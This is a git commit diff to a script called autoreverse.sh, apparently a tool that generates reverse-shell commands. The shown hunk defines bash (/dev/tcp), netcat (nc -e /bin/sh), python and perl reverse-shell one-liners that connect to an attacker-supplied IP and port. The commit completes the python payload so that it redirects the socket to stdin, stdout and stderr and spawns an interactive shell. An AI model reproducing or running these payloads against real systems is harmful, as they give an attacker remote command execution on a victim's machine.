0ff91e2d657c46a54610a09729aef4e60c53cdbd
CronoX1 <91015518+CronoX1@users.noreply.github.com>
2021-10-03 18:23:36 +0200

    Update autoreverse.sh

--- autoreverse.sh
+++ autoreverse.sh
@@ -24,7 +24,7 @@ bash="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
 
 nc="nc -e /bin/sh $IP $PORT"
 
-python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os."
+python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
 
 perl="perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,"
 
